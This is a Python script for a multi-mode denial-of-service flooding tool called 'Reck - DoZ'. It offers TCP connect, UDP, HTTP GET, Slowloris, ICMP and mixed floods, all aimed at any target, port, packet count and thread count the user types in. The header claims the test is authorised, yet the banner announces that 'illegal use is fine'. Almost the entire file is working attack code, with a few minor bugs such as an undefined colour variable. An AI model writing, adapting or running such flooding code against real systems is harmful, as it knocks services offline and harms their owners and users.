#!/usr/bin/env python3
"""
Reck - DoZ (I have permission and am authorized to perform this pentest)
"""

import socket
import threading
import random
import time
import sys
import os
import signal

# ── Colour Codes ──────────────────────────────────────────────
R = "\033[91m"
G = "\033[92m"
DG = "\033[32m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
N = "\033[0m"
BOLD = "\033[1m"

# ── Banner ────────────────────────────────────────────────────
BANNER = f"""
{DG}{BOLD}
                  ██████  ███████  ██████  ██   ██ ███    ██
                  ██   ██ ██      ██       ██  ██  ████   ██
                  ██████ █████   ██  ███ █████   ██ ██  ██
                  ██   ██ ██      ██    ██ ██  ██  ██  ██ ██
                  ██   ██ ███████  ██████  ██   ██ ██   ████
{N}
{C}{BOLD}╔══════════════════════════════════════════════════╗
║       DoS      Multi testing DoS flooding tool                     ║
║  {R}illegal use is fine but owner is not responsible for damage {C}║
║   {G}Tool cannot bypass anything cuz that's illegal             {C}║
╚══════════════════════════════════════════════════════════╝{N}

{Y}[+] Loaded Attack Modules:{N}
{G}  1{N} - tcp        (TCP Connect Flood)
{G}  2{N} - udp        (UDP Flood)
{G}  3{N} - http       (HTTP GET Flood)
{G}  4{N} - slowloris  (Slowloris)
{G}  5{N} - icmp       (ICMP Flood - requires scapy)
{G}  6{N} - mixed      (Mixed Assault)

{N}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{N}
"""

DOWN_BANNER = f"""
{R}{BOLD}██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗██╔═══██╗██║    ██║████╗  ██║
██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝{N}
"""

# ── Shared State ─────────────────────────────────────────────
stop_attack = False
packets_sent = 0
target_packets = 0
lock = threading.Lock()

def inc():
    global packets_sent
    with lock:
        packets_sent += 1

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n{R}[!] Halted.{N}")
    stop_attack = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear():
    os.system("clear" if os.name == "posix" else "cls")

# ── 1. TCP Connect Flood (real packets) ──────────────────────
def tcp_flood(ip, port, count):
    global stop_attack
    sent = 0
    while sent < count and not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode())
            s.close()
            inc()
            sent += 1
        except:
            inc()
            sent += 1
            pass

# ── 2. UDP Flood (real packets) ──────────────────────────────
def udp_flood(ip, port, count):
    global stop_attack
    data = random._urandom(1024)
    sent = 0
    while sent < count and not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (ip, port))
            s.close()
            inc()
            sent += 1
        except:
            pass

# ── 3. HTTP GET Flood (real packets) ─────────────────────────
def http_flood(ip, port, count):
    global stop_attack
    uas = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    ]
    sent = 0
    while sent < count and not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            req = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {random.choice(uas)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(req.encode())
            s.recv(128)
            s.close()
            inc()
            sent += 1
        except:
            pass

# ── 4. Slowloris ─────────────────────────────────────────────
def slowloris(ip, port, host=None):
    global stop_attack
    if not host:
        host = ip
    sockets = []
    for _ in range(150):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(s)
            inc()
        except:
            pass
    end = time.time() + 30
    while time.time() < end and not stop_attack:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
                inc()
            except:
                sockets.remove(s)
        while len(sockets) < 150 and not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                sockets.append(s)
                inc()
            except:
                break
        time.sleep(10)
    for s in sockets:
        try:
            s.close()
        except:
            pass

# ── 5. ICMP Flood ────────────────────────────────────────────
def icmp_flood(ip, count):
    try:
        from scapy.all import IP, ICMP, send
    except ImportError:
        print(f"{R}[!] Scapy not installed.{N}")
        return
    global stop_attack
    sent = 0
    while sent < count and not stop_attack:
        try:
            send(IP(dst=ip)/ICMP(), verbose=False, count=1)
            inc()
            sent += 1
        except:
            pass

# ── CONNECTION DOWN! Spammer ─────────────────────────────────
def connection_down_spammer(total):
    global packets_sent, stop_attack
    while packets_sent < total and not stop_attack:
        current = packets_sent
        print(f"\r{R}{BOLD}CONNECTION DOWN! [{current}/{total}]{N}", end="", flush=True)
        time.sleep(0.005)
    if not stop_attack:
        print(f"\r{R}{BOLD}CONNECTION DOWN! [{total}/{total}]{N}")

# ── Launcher ──────────────────────────────────────────────────
def launch(mode, ip, port, total, threads):
    global stop_attack, packets_sent, target_packets
    stop_attack = False
    packets_sent = 0
    target_packets = total

    print(f"\n{G}[+] Starting {mode} on {ip}:{port}")
    print(f"[+] Packets: {total} | Threads: {threads}{N}")
    time.sleep(0.5)

    per_thread = max(1, total // threads)
    pool = []

    for _ in range(threads):
        if mode == "tcp":
            t = threading.Thread(target=tcp_flood, args=(ip, port, per_thread), daemon=True)
        elif mode == "udp":
            t = threading.Thread(target=udp_flood, args=(ip, port, per_thread), daemon=True)
        elif mode == "http":
            t = threading.Thread(target=http_flood, args=(ip, port, per_thread), daemon=True)
        elif mode == "slowloris":
            t = threading.Thread(target=slowloris, args=(ip, port), daemon=True)
            break
        elif mode == "icmp":
            t = threading.Thread(target=icmp_flood, args=(ip, per_thread), daemon=True)
        else:
            continue
        t.start()
        pool.append(t)

    # Start the CONNECTION DOWN! spammer
    spam = threading.Thread(target=connection_down_spammer, args=(total,), daemon=True)
    spam.start()

    for t in pool:
        t.join()

    stop_attack = True
    time.sleep(0.2)

    clear()
    print(DOWN_BANNER)
    print(f"{G}[✓] {packets_sent} real packets sent to {ip}:{port}{N}")

# ── Interactive Menu ─────────────────────────────────────────
def menu():
    clear()
    print(BANNER)

    print(f"{W}Enter target:{N}", end=" ")
    ip = input().strip()

    print(f"{W}Enter port:{N}", end=" ")
    port = int(input().strip())

    print(f"{W}Enter number of packets:{N}", end=" ")
    total = int(input().strip())

    print(f"{W}Enter number of threads:{N}", end=" ")
    threads = int(input().strip())

    print(f"\n{Y}Select attack mode:{N}")
    print(f"  {G}1{N} - tcp   (TCP Connect Flood)")
    print(f"  {G}2{N} - udp   (UDP Flood)")
    print(f"  {G}3{N} - http  (HTTP GET Flood)")
    print(f"  {G}4{N} - slowloris (Slowloris)")
    print(f"  {G}5{N} - icmp  (ICMP Flood)")
    print(f"  {G}6{N} - mixed (Mixed Assault)")
    print(f"\n{W}Choice:{N}", end=" ")
    c = input().strip().lower()

    alias = {
        "1": "tcp", "tcp": "tcp", "tcpflood": "tcp",
        "2": "udp", "udp": "udp", "udpflood": "udp",
        "3": "http", "http": "http", "httpflood": "http",
        "4": "slowloris", "slowloris": "slowloris",
        "5": "icmp", "icmp": "icmp", "icmpflood": "icmp",
        "6": "mixed", "mixed": "mixed",
    }

    if c in alias:
        mode = alias[c]
    else:
        print(f"{R}[!] Invalid.{N}")
        sys.exit(1)

    if mode == "mixed":
        print(f"\n{M}[+] Mixed mode...{N}")
        for m in ["tcp", "udp", "http"]:
            t = threading.Thread(target=launch, args=(m, ip, port, total // 3, max(1, threads // 3)), daemon=True)
            t.start()
        input(f"{Y}Press Enter to stop...{N}")
        stop_attack = True
    else:
        launch(mode, ip, port, total, threads)

# ── Entry ─────────────────────────────────────────────────────
if __name__ == "__main__":
    menu()
